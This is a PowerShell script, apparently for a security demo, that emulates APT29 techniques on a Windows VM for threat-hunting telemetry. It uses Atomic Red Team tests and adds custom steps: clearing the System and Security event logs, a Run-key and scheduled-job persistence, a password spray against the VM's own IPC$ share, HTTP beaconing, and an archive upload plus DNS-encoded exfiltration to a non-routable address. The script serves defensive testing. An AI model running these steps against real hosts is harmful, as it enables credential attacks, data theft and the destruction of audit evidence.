<#
.SYNOPSIS
  Re-runnable APT29-style emulation using Atomic Red Team tests plus a few benign built-in steps.
  Runs on the Windows demo VM.

.DESCRIPTION
  The step list below mirrors config/apt29-atomics.json (embedded so this is one self-contained
  file that can be sent with `az vm run-command invoke`). If the two diverge, update this list.
  Atomic test numbers are unverified; check with Invoke-AtomicTest <T> -ShowDetailsBrief on the VM
  if a test is reported as missing in the log.

  Entries with a "custom" id (spray, beacon, stage, exfil) are built into this script because no
  suitable Atomic test exists. They are benign: they touch only the VM itself, its own private IP,
  .invalid names (never resolve) and RFC 5737 192.0.2.10 (never routable). No real malware.

  Modes:
    Run      cleanup of previous artefacts, prerequisites, execute steps in order, log results
    Cleanup  cleanup only (used by scripts/reset-demo.sh)

  Expects Invoke-AtomicRedTeam at C:\AtomicRedTeam (installed by the VM bootstrap).
  Log: C:\demo\apt29-run.log
#>
param(
  [ValidateSet('Run', 'Cleanup')]
  [string]$Mode = 'Run',
  [int]$SleepSeconds = 15
)

$ErrorActionPreference = 'Continue'
$logDir = 'C:\demo'
$log = Join-Path $logDir 'apt29-run.log'
$dummyDir = Join-Path $logDir 'dummy-data'
$stagingDir = Join-Path $logDir 'staging'
New-Item -ItemType Directory -Force -Path $logDir | Out-Null

function Write-Log([string]$msg) {
  $line = '{0} {1}' -f (Get-Date).ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ssZ'), $msg
  Add-Content -Path $log -Value $line
  Write-Output $line
}

# Mirrors config/apt29-atomics.json
$atomicsJson = @'
[
  {"technique": "T1070.001", "tests": [], "custom": "clearlog", "tactic": "defense-evasion", "note": "Clear the System and Security event logs"},
  {"technique": "T1027", "tests": [2], "custom": null, "tactic": "defense-evasion", "note": "base64-encoded PowerShell"},
  {"technique": "T1547.001", "tests": [1], "custom": null, "tactic": "persistence", "note": "Registry Run key (atomic)"},
  {"technique": "T1547.001", "tests": [], "custom": "runkey", "tactic": "persistence", "note": "HKLM Run key value with a benign command"},
  {"technique": "T1053.005", "tests": [1], "custom": null, "tactic": "persistence", "note": "Scheduled task (local)"},
  {"technique": "T1053.002", "tests": [], "custom": "jobfile", "tactic": "persistence", "note": "Dummy .job file in C:\\Windows\\Tasks"},
  {"technique": "T1546.003", "tests": [1], "custom": null, "tactic": "persistence", "note": "WMI event subscription (atomic)"},
  {"technique": "T1110.003", "tests": [], "custom": "spray", "tactic": "credential-access", "note": "Password spray against local accounts (self-targeted)"},
  {"technique": "T1071.001", "tests": [], "custom": "beacon", "tactic": "command-and-control", "note": "C2-style HTTP beaconing (telemetry for hunting)"},
  {"technique": "T1105", "tests": [7], "custom": null, "tactic": "command-and-control", "note": "Ingress tool transfer via certutil (may be blocked by Defender; telemetry only)"},
  {"technique": "T1560.001", "tests": [], "custom": "stage", "tactic": "collection", "note": "Data staging (telemetry for hunting)"},
  {"technique": "T1048.003", "tests": [], "custom": "exfil", "tactic": "exfiltration", "note": "Exfiltration attempt to non-routable address (telemetry for hunting)"}
]
'@
$atomics = $atomicsJson | ConvertFrom-Json

$module = 'C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1'
$atomicsPath = 'C:\AtomicRedTeam\atomics'
if (-not (Test-Path $module)) {
  Write-Log "ERROR: Invoke-AtomicRedTeam not found at $module (VM bootstrap incomplete?)"
  exit 1
}
Import-Module $module -Force
$PSDefaultParameterValues['Invoke-AtomicTest:PathToAtomicsFolder'] = $atomicsPath

# ---- Built-in benign steps -------------------------------------------------

function Get-SelfIp {
  $ip = Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
    Where-Object { $_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.254.*' } |
    Select-Object -First 1 -ExpandProperty IPAddress
  if (-not $ip) { $ip = '127.0.0.1' }
  return $ip
}

function Invoke-CustomStep([string]$id) {
  switch ($id) {
    'clearlog' {
      # Clearing System and Security raises "Windows Event Logs Cleared". Security is cleared first
      # in the run, so the later password spray recreates the 4625 events the identity hunt uses.
      wevtutil cl System 2>&1 | Out-Null
      wevtutil cl Security 2>&1 | Out-Null
      Write-Log '  cleared the System and Security event logs'
    }
    'runkey' {
      New-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'DemoUpdater' `
        -Value 'cmd.exe /c echo apt29-demo' -PropertyType String -Force | Out-Null
      Write-Log '  wrote HKLM Run value DemoUpdater (benign command)'
    }
    'jobfile' {
      Set-Content -Path 'C:\Windows\Tasks\DemoUpdate.job' -Value 'SYNTHETIC DEMO FILE - not a real job'
      Write-Log '  created C:\Windows\Tasks\DemoUpdate.job (dummy file)'
    }
    'spray' {
      # Wrong passwords for nonexistent local users against this VM's own IPC$ share (logon type 3
      # failures, event 4625). Nonexistent accounts cannot be locked out.
      $ip = Get-SelfIp
      Write-Log "  spray target $ip (self)"
      $users = 'svc-backup', 'svc-sql', 'helpdesk', 'jsmith', 'adm-it', 'scan-user', 'testuser', 'ops-admin'
      $pw = 'Winter2026!', 'Summer2026!', 'Password1'
      foreach ($u in $users) {
        foreach ($p in $pw) {
          cmd.exe /c "net use \\$ip\IPC$ /user:$u $p" 2>&1 | Out-Null
        }
      }
      Write-Log ('  spray attempts: {0}' -f ($users.Count * $pw.Count))
    }
    'beacon' {
      # Fixed-interval HTTP beacon to a name that never resolves (RFC 6761 .invalid).
      for ($i = 1; $i -le 8; $i++) {
        try {
          Invoke-WebRequest -Uri 'http://update-check.beacon-demo.invalid/api/v1/poll?id=APT29DEMO' `
            -UserAgent 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)' `
            -TimeoutSec 3 -UseBasicParsing | Out-Null
        } catch { }
        Start-Sleep -Seconds 5
      }
      Write-Log '  beacon: 8 requests sent (expected to fail DNS resolution)'
    }
    'stage' {
      New-Item -ItemType Directory -Force -Path $dummyDir, $stagingDir | Out-Null
      1..5 | ForEach-Object {
        Set-Content -Path (Join-Path $dummyDir ("synthetic-report-$_.txt")) -Value ("SYNTHETIC DEMO DATA $_ - not real")
      }
      Compress-Archive -Path (Join-Path $dummyDir '*') -DestinationPath (Join-Path $stagingDir 'archive.zip') -Force
      Write-Log "  staged archive: $(Join-Path $stagingDir 'archive.zip')"
    }
    'exfil' {
      $zip = Join-Path $stagingDir 'archive.zip'
      try {
        if (Test-Path $zip) {
          # 192.0.2.10 is TEST-NET-1 (RFC 5737): never routable, so nothing leaves the VM.
          Invoke-WebRequest -Uri 'http://192.0.2.10:8443/upload' -Method Post -InFile $zip `
            -TimeoutSec 5 -UseBasicParsing | Out-Null
        }
      } catch { }
      1..4 | ForEach-Object {
        try { Resolve-DnsName -Name ("c3luY2VkLWRhdGEt$_.exfil-demo.invalid") -ErrorAction Stop | Out-Null } catch { }
      }
      Write-Log '  exfil attempt sent to 192.0.2.10 and .invalid names (expected to fail)'
    }
    default { Write-Log "  unknown custom step: $id" }
  }
}

function Clear-CustomStep([string]$id) {
  switch ($id) {
    'spray' { cmd.exe /c 'net use * /delete /y' 2>&1 | Out-Null }
    'runkey'  { Remove-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'DemoUpdater' -ErrorAction SilentlyContinue }
    'jobfile' { Remove-Item -Force -ErrorAction SilentlyContinue 'C:\Windows\Tasks\DemoUpdate.job' }
    'stage' { Remove-Item -Recurse -Force -ErrorAction SilentlyContinue $dummyDir, $stagingDir }
    default { }
  }
}

# ---- Cleanup / prerequisites / run ------------------------------------------

function Invoke-Cleanup {
  foreach ($a in $atomics) {
    if ($a.custom) {
      Write-Log "cleanup custom $($a.custom)"
      try { Clear-CustomStep $a.custom } catch { Write-Log "  cleanup warning: $($_.Exception.Message)" }
      continue
    }
    foreach ($n in $a.tests) {
      try {
        Write-Log "cleanup $($a.technique) #$n"
        Invoke-AtomicTest $a.technique -TestNumbers $n -Cleanup -Confirm:$false 2>&1 | ForEach-Object { Write-Log "  $_" }
      } catch { Write-Log "  cleanup warning: $($_.Exception.Message)" }
    }
  }
}

Write-Log "=== APT29 emulation: mode=$Mode ==="

Invoke-Cleanup
if ($Mode -eq 'Cleanup') { Write-Log '=== cleanup complete ==='; exit 0 }

# Prerequisites (atomic steps only)
foreach ($a in $atomics) {
  if ($a.custom) { continue }
  foreach ($n in $a.tests) {
    try {
      Write-Log "prereqs $($a.technique) #$n"
      Invoke-AtomicTest $a.technique -TestNumbers $n -GetPrereqs -Confirm:$false 2>&1 | ForEach-Object { Write-Log "  $_" }
    } catch { Write-Log "  prereq warning: $($_.Exception.Message)" }
  }
}

# Execute in order
$ok = 0; $failed = 0
foreach ($a in $atomics) {
  if ($a.custom) {
    Write-Log "RUN $($a.technique) custom:$($a.custom) [$($a.tactic)] $($a.note)"
    try { Invoke-CustomStep $a.custom; $ok++ } catch { Write-Log "  FAILED: $($_.Exception.Message)"; $failed++ }
    Start-Sleep -Seconds 5
    continue
  }
  foreach ($n in $a.tests) {
    Write-Log "RUN $($a.technique) #$n [$($a.tactic)] $($a.note)"
    try {
      Invoke-AtomicTest $a.technique -TestNumbers $n -Confirm:$false 2>&1 | ForEach-Object { Write-Log "  $_" }
      $ok++
    } catch {
      Write-Log "  FAILED: $($_.Exception.Message)"
      $failed++
    }
    Start-Sleep -Seconds $SleepSeconds
  }
}

Write-Log "=== done: executed=$ok failed=$failed. Artefacts remain until the next run or Mode=Cleanup ==="
exit 0
